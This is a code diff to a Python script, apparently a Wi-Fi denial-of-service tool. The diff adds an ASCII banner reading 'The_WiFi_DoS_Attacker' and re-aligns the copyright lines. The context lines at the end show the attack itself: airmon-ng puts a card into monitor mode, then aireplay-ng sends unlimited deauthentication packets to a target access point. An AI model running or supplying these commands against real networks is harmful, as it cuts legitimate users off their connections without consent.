@@ -49,12 +49,26 @@ print(r"""______            _     _  ______                 _           _
 |_____/ \__,_|_|  |_|\_\     |_____/ \___/ \__,_|_|
                                                    
                       """)
+                      
+print(r"""______            _     _  ______                 _           _ 
+
+
+  ________           _       ___ _______      ____                  ___   __  __             __            
+ /_  __/ /_  ___    | |     / (_) ____(_)    / __ \____  _____     /   | / /_/ /_____ ______/ /_____  _____
+  / / / __ \/ _ \   | | /| / / / /_  / /    / / / / __ \/ ___/    / /| |/ __/ __/ __ `/ ___/ //_/ _ \/ ___/
+ / / / / / /  __/   | |/ |/ / / __/ / /    / /_/ / /_/ (__  )    / ___ / /_/ /_/ /_/ / /__/ ,< /  __/ /    
+/_/ /_/ /_/\___/____|__/|__/_/_/   /_/____/_____/\____/____/____/_/  |_\__/\__/\__,_/\___/_/|_|\___/_/     
+              /_____/               /_____/               /_____/                                          
+
+
+
+                      """)
 
 print("\n****************************************************************")
-print("\n* Copyright of Jinoy Varghese, 2021                              *")
-print("\n* https://cspsyco.blogspot.com                                *")
-print("\n* https://www.youtube.com/c/CSPsyco                       *")
-print("\n* https://github.com/Jinoy-Varghese/dark-soul                     *")
+print("\n* Copyright of Jinoy Varghese, 2021                            *")
+print("\n* https://cspsyco.blogspot.com                                 *")
+print("\n* https://www.youtube.com/c/CSPsyco                            *")
+print("\n* https://github.com/Jinoy-Varghese/dark-soul                  *")
 print("\n****************************************************************")
 
 
@@ -200,6 +214,5 @@ subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
 
 # User will need to use control-c to break the script.
-
 
 
